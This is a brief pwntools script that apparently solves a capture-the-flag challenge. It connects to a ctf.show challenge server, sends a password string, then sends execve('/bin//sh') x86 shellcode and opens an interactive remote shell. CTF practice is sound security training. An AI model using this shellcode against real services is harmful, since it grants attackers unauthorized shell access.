from pwn import *
# io = process("./pwn124")
io = remote("pwn.challenge.ctf.show",28200)
io.sendline(b"CTFshowPWN")
io.sendline(b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")
io.interactive()
